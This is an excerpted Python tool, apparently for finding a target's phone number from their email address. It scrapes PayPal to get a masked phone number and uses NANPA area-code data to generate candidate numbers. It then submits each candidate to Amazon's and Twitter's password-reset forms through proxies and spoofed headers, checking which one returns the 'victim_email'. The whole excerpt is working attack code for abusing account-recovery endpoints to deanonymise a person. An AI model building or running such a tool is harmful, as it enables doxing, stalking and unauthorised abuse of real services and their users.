    ...
    for phone_number in phone_numbers:
        ...
        if "Location" in response.headers:
            ...
            if "prevRID" in redirect_url:
                ...
                response = session.get(
                    f"https://www.amazon.com{redirect_url}",
                    headers={
                        "Cache-Control": "max-age=0",
                        "Upgrade-Insecure-Requests": "1",
                        "User-Agent": user_agent,
        ...
        if response.status_code >= 500:
            ...
            response = session.post(
                f"https://www.amazon.com/ap/forgotpassword/options?ie=UTF8&openid.pape.max_auth_age=0&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&paramJwt={redirect_param_jwt}&pageId=usflex&ignoreAuthState=1&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref3Dnav_custrec_signin&prevRID={redirect_prev_rid}&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net2Fextensions%2Fpape%2F1.0&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0",
                headers={
                    "Cache-Control": "max-age=0",
                    "Origin": "https://www.amazon.com",
                    "Upgrade-Insecure-Requests": "1",
                ...
                data=f"prevRID={prevrid_search}&workflowState={workflow_state}&fppOptions=notSkip",
                proxies=proxy,
                verify=verifyProxy,
            )
            ...
            if len(victim_email) == len(masked_email) \
...
def get_masked_email_twitter(phone_numbers, victim_email, verbose):
    ...
    for phone_number in phone_numbers:
        ...
        response = session.post(
            ...
            data=f"authenticity_token={authenticity_token}&account_identifier={phone_number}",
            allow_redirects=False,
            proxies=proxy,
            verify=verifyProxy,
        )
...
def scrape_paypal(email):
    ...
    response = session.post(
        ...
        data=f"email={email}&_csrf={_csrf}",
        proxies=proxy,
        verify=verifyProxy,
    )
    ...
    response = session.get(
        f"https://www.paypal.com/authflow/entry/?clientInstanceId={client_instance_id}",
        headers={
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
...
def get_possible_phone_numbers(masked_phone):
    ...
    nampa_file = "allutlzd"
    if (
        not os.path.exists(f"./{nampa_file}.zip")
        or time.time() - os.path.getmtime(f"./{nampa_file}.zip") > 24 * 60 * 60
    ):
        logger.info(
        ...
        with open(f"{nampa_file}.zip", "wb") as code:
            code.write(response.content)
        logger.info("NANPA file downloaded successfully")
    archive = zipfile.ZipFile(f"./{nampa_file}.zip", 'r')
    file = archive.read(f'{nampa_file}.txt').decode('utf-8')
    archive.close()
    ...
    regex_area_code_exchange = re.sub(
        "X", "[0-9]{1}", f"({masked_phone[:3]}-{masked_phone[3:6]})"
    )
    ...
    for possible_area_codes in regex_possible_area_codes:
        ...
        for block_number in block_numbers:
            ...
            possible_phone_numbers.extend(
                area_code
                + exchange
                + block_number
                + masked_phone_formatted.format(*x)
                for x in product(
                    "0123456789", repeat=remaining_unsolved_digits
                )
            )
